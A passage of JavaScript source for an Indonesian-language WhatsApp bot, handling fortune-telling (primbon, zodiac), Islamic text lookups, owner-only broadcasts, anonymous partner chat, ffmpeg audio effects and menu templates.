haikal.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'sifat': case 'karakter': {
if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'keberuntungan': {
if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case 'memancing': {
if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'masasubur': {
if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'bcgc': case 'bcgroup': {
if (!isCreator) return
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await haikal.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
bangkal(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
let btn = [{
urlButton: {
displayText: 'Sc Bot',
url: 'https://youtube.com/c/YosokaNesia'
}
}, {
callButton: {
displayText: 'Number Phone Owner',
phoneNumber: '+6283844775996'
}
}, {
quickReplyButton: {
displayText: 'Status Bot',
id: 'ping'
}
}, {
quickReplyButton: {
displayText: 'Contact Owner',
id: 'owner'
}  
}, {
quickReplyButton: {
displayText: 'YouTube',
id: 'sc'
}
}]
  let txt = `「 Broadcast Bot 」\n\n${text}`
  haikal.send5ButImg(i, txt, haikal.user.name, global.thumb, btn)
}
bangkal(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
//=================================================//
case 'bc': case 'broadcast': case 'bcall': {
if (!isCreator) return
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let anu = await store.chats.all().map(v => v.id)
bangkal(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
for (let yoi of anu) {
await sleep(1500)
let btn = [{
urlButton: {
displayText: 'Sc Bot',
url: 'https://youtube.com/c/YosokaNesia'
}
}, {
callButton: {
displayText: 'Number Phone Owner',
phoneNumber: '+6283844775996'
}
}, {
quickReplyButton: {
displayText: 'Status Bot',
id: 'ping'
}
}, {
quickReplyButton: {
displayText: 'Contact Owner',
id: 'owner'
}  
}, {
quickReplyButton: {
displayText: 'YouTube',
id: 'sc'
}
}]
  let txt = `「 Broadcast Bot 」\n\n${text}`
  haikal.send5ButImg(yoi, txt, haikal.user.name, global.thumb, btn)
}
bangkal('Sukses Broadcast')
}
break
//=================================================//
case 'cerpen':{
if (!q) return bangkal(`

Judul cerpen yang tersedia lihat di list *CERPEN MENU*
┏━━⊱   

 cerpen anak

 cerpen bahasa daerah

 cerpen bahasa inggrisKak

 cerpen bahasa jawa

 cerpen bahasa sunda

 cerpen budaya

 cerpen cinta

 cerpen cinta islami

 cerpen cinta pertama

 cerpen cinta romantis

 cerpen cinta sedih

 cerpen cinta segitiga

 cerpen cinta sejati

 cerpen galau

 cerpen gokil

 cerpen inspiratif

 cerpen jepang

 cerpen kehidupan

 cerpen keluarga

 cerpen kisah nyata

 cerpen korea

 cerpen kristen

 cerpen liburan

 cerpen lingkungan

 cerpen lucu

 cerpen malaysia

 cerpen mengharukan

 cerpen misteri

 cerpen motivasi

 cerpen nasihat

 cerpen nasionalisme

 cerpen olahraga

 cerpen patah hati

 cerpen penantian

 cerpen pendidikan

 cerpen pengalaman pribadi

 cerpen pengorbanan

 cerpen penyesalan

 cerpen perjuangan

 cerpen perpisahan

 cerpen persahabatan

 cerpen petualangan

 cerpen ramadhan

 cerpen remaja

 cerpen renungan

 cerpen rindu

 cerpen rohani

 cerpen romantis

 cerpen sastra

 cerpen sedih

 cerpen sejarah

 cerpen slice of life

 cerpen terjemahan

 cerpen thriller

┗━━⊱`)
let cerpe = await cerpen(q)
var memek = await getBuffer(picak+`Cerpen ${q}`)
await haikal.send5ButImg(from, `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`, `© ${ownername}`,memek, [{"urlButton": {"displayText": "YouTube Creator","url": `${youtube}`}}] )
}
break
//=================================================//
case 'zodiak': case 'zodiac': {
if (!text) throw `Example : ${prefix+ command} 7 7 2005`
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'shio': {
if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
let anu = await primbon.shio(text)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Hasil :* ${anu.message}`, m)
}
break
//=================================================// 
case 'umma': case 'ummadl': {
if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
let { umma } = require('./lib) scraper')
let anu = await umma(isUrl(text)[0])
if (anu.type == 'video') {
let buttons = [
{buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
{buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
]
let buttonMessage = {
image: { url: anu.author.profilePic },
caption: `
⭔ Title : ${anu.title}
⭔ Author : ${anu.author.name}
⭔ Like : ${anu.like}
⭔ Caption : ${anu.caption}
⭔ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
footer: haikal.user.name,
buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: hw })
} else if (anu.type == 'image') {
anu.media.map(async (url) => {
haikal.sendMessage(m.chat, { image: { url }, caption: `⭔ Title : ${anu.title}\n⭔ Author : ${anu.author.name}\n⭔ Like : ${anu.like}\n⭔ Caption : ${anu.caption}` }, { quoted: hw })
})
}
}
break
//=================================================//
case 'ringtone': {
if (!text) throw `Example : ${prefix + command} black rover`
let { ringtone } = require('./lib/scraper')
let anu = await ringtone(text)
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: hw })
}
break
//=================================================//
case 'iqra': {
oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
if (!text) throw oh
yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:hw}).catch ((err) => bangkal(oh))
}
break
//=================================================//
case 'juzamma': {
if (args[0] === 'pdf') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:hw})
} else if (args[0] === 'docx') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:hw})
} else if (args[0] === 'pptx') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:hw})
} else if (args[0] === 'xlsx') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:hw})
} else {
bangkal(`Mau format apa ? Example : ${prefix + command} pdf
Format yang tersedia : pdf, docx, pptx, xlsx`)
}
}
break
//=================================================//
case 'hadis': case 'hadist': {
if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1
Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find(v => v.number == args[1])
bangkal(`No. ${number}
${arab}
${id}`)
} catch (e) {
bangkal(`Hadis tidak ditemukan !`)
}
}
break
//=================================================//
case 'alquran': {
if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
bangkal(txt)
haikal.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : hw })
}
break
//=================================================//
case 'tafsirsurah': {
if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `「 *Tafsir Surah*  」
*Pendek* : ${res.result.data.tafsir.id.short}
*Panjang* : ${res.result.data.tafsir.id.long}
( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
bangkal(txt)
}
break
//=================================================//
   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return bangkal(err)
let buff = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : hw })
fs.unlinkSync(ran)
})
} else bangkal(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
bangkal(e)
}
break
//=================================================//
case 'setcmd': {
if (!isCreator) return
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
bangkal(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isCreator) return
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'  
delete global.db.data.sticker[hash]
bangkal(`Done!`)
}
break
//=================================================//
case 'listcmd': {
if (!isCreator) return
let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
haikal.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'lockcmd': {
if (!isCreator) return
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
global.db.data.sticker[hash].locked = !/^un/i.test(command)
bangkal('Done!')
}
break
//=================================================//
case 'addmsg': {
if (!isCreator) return
if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
if (!text) throw `Example : ${prefix + command} nama file`
let msgs = global.db.data.database
if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
msgs[text.toLowerCase()] = quoted.fakeObj
bangkal(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break
//=================================================//
case 'getmsg': {
if (!isCreator) return
if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
haikal.copyNForward(m.chat, msgs[text.toLowerCase()], true)
}
break
//=================================================//
case 'listmsg': {
if (!isCreator) return
let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
bangkal(teks)
}
break
//=================================================//
case 'delmsg': case 'deletemsg': {
if (!isCreator) return
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return bangkal(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
bangkal(`Berhasil menghapus '${text}' dari list pesan`)
}
break
//=================================================//
case 'anonymous': {
if (!isCreator) return
if (m.isGroup) return bangkal('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let buttons = [
{ buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
]
haikal.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await haikal.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, haikal.user.name, m)
}
break
//=================================================//
case 'keluar': case 'leave': {
if (m.isGroup) return bangkal('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!room) {
let buttons = [
{ buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
throw false
}
bangkal('Ok')
let other = room.other(m.sender)
if (other) await haikal.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
delete this.anonymous[room.id]
if (command === 'leave') 
break
}
case 'mulai': case 'start': {
if (m.isGroup) return bangkal('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
let buttons = [
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, haikal.user.name, m)
throw false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
let buttons = [
{ buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
]
await haikal.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, haikal.user.name, m)
room.b = m.sender
room.state = 'CHATTING'
await haikal.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, haikal.user.name, m)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
let buttons = [
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, haikal.user.name, m)
}
break
}
case 'next': case 'lanjut': {
if (m.isGroup) return bangkal('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
let buttons = [
{ buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
throw false
}
let other = romeo.other(m.sender)
if (other) await haikal.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
let buttons = [
{ buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
]
await haikal.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, haikal.user.name, m)
room.b = m.sender
room.state = 'CHATTING'
await haikal.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, haikal.user.name, m)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
let buttons = [
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, haikal.user.name, m)
}
break
}
case 'public': {
if (!isCreator) return
haikal.public = true
bangkal('Sukse Change To Public')
}
break
//=================================================//
case 'self': {
if (!isCreator) return
haikal.public = false
bangkal('Sukses Change To Self')
}
break
//=================================================//
case 'ping': case 'botstatus': case 'statusbot': {
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
bangkal(respon)
}
break
//=================================================//
case 'speedtest': {
if (!isCreator) return
bangkal('Testing Speed...')
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
  let o
  try {
  o = await exec('python speed.py')
  } catch (e) {
  o = e
 } finally {
let { stdout, stderr } = o
if (stdout.trim()) bangkal(stdout)
if (stderr.trim()) bangkal(stderr)
}
}
break
//=================================================//
case 'owner': case 'creator': {
haikal.sendContact(m.chat, global.owner, m)
}
break
//=================================================//  
case 'setmenu': {
if (!isCreator) return
let setbot = db.data.settings[botNumber]
   if (args[0] === 'templateImage'){
setbot.templateImage = true
setbot.templateVideo = false
setbot.templateGif = false
setbot.templateMsg = false
bangkal(mess.success)
} else if (args[0] === 'templateVideo'){
setbot.templateImage = false
setbot.templateVideo = true
setbot.templateGif = false
setbot.templateMsg = false
bangkal(mess.success)
} else if (args[0] === 'templateGif'){
setbot.templateImage = false
setbot.templateVideo = false
setbot.templateGif = true
setbot.templateMsg = false
bangkal(mess.success)
} else if (args[0] === 'templateMessage'){
setbot.templateImage = false
setbot.templateVideo = false
setbot.templateGif = false
setbot.templateMsg = true
bangkal(mess.success)
} else {
let sections = [
{
title: "CHANGE MENU BOT",
rows: [
{title: "Template Image", rowId: `setmenu templateImage`, description: `Ubah bot menu menjadi Template Image`},
{title: "Template Video", rowId: `setmenu templateVideo`, description: `Ubah bot menu menjadi Template Video`},
{title: "Template Gif", rowId: `setmenu templateGif`, description: `Ubah bot menu menjadi Template Gif`},
{title: "Template Message", rowId: `setmenu templateMessage`, description: `Ubah bot menu menjadi Pesan Template `}
]
},
]
haikal.sendListMsg(m.chat, `Silahkan Pilih SetMenu Yang Anda Mau!`, haikal.user.name, `Hay Kak ${pushname} 👋`, `Click Disini`, sections, m)
}
}
break
case 'allmenu': {
if(typemenu == 'image'){
await haikal.send5ButImg(from, `` + '' + lang.menu(botname, pushname, salam), `© ${ownername}`,thumb, [{"urlButton": {"displayText": "YouTube","url": `${youtube}`}},{"urlButton": {"displayText": `Trava Playsit`,"url": `${myweb}`}},{"quickReplyButton": {"displayText": "Owner","id": 'owner'}},{"quickReplyButton": {"displayText": "Bug Menu","id": 'bugmenu'}}] )
}
}
break
//=================================================//
case 'menu': {
anu = `Hay Kak ${pushname} 👋 Selamat ${salam}

◎ Owner : ${botname}
◎ Lib : Multi-Device
◎ Terbit : *99-999-9999*

[ 🇬🇧 This is a Private Bot Press All Menu To See All ]
[ 🇲🇨 Ini Adalah Bot Pribadi Tekan Semua Menu Untuk Melihat Semua ]
「🇯🇵これはプライベートボットですすべてを表示するには、すべてのメニューを押してください」
[ 🇵🇹 Este é um Bot Privado Pressione Todos Menu Para Ver Todos ]`
let btn = [{
urlButton: {
displayText: 'Sc Bot',
url: 'https://youtube.com/c/YosokaNesia'
}
}, {
callButton: {
displayText: 'Number Phone Owner',
phoneNumber: '+6285891634201'
}
}, {
quickReplyButton: {
displayText: 'Status Bot',
id: 'ping'
}
}, {
quickReplyButton: {
displayText: 'All Menu',
id: 'allmenu'
}  
}, {
quickReplyButton: {
displayText: 'YouTube',
id: 'sc'
}
}]
 let setbot = db.data.settings[botNumber]
if (setbot.templateImage) {
haikal.send5ButImg(m.chat, anu, haikal.user.name, global.thumb, btn)
} else if (setbot.templateGif) {
haikal.send5ButGif(m.chat, anu, haikal.user.name, global.visoka, btn)
} else if (setbot.templateVideo) {
haikal.send5ButVid(m.chat, anu, haikal.user.name, global.visoka, btn)
} else if (setbot.templateMsg) {
haikal.send5ButMsg(m.chat, anu, haikal.user.name, btn)
}
}
break
//=================================================//
case 'bot': {
buffer = await getBuffer(`https://telegra.ph/file/5b6cf06c6c5dc1cc62e43.jpg`)
